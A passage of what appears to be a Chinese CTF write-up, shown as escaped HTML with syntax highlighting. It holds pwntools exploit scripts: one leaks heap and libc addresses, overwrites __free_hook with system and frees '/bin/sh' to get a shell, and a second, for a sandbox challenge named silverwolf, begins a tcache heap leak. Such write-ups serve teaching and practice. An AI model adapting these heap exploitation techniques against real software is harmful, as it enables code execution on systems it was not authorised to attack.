&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Register&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fmyy&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TMP&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xF0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TMP&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000004000000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2F0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HEAP:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TMP&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xF8&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4A1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3A0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#fmyy&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3A0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x2F0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TMP&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xF0&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;TMP&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000004000000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x16DEF0&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x170&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x150&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;FMYY&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x110&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;UnRegister&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;silverwolf&#34;&gt;silverwolf&lt;/h3&gt;
&lt;p&gt;沙盒&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;choice:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Size:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./flag&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Content: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x5B0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x940&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x70&lt;/span&gt;
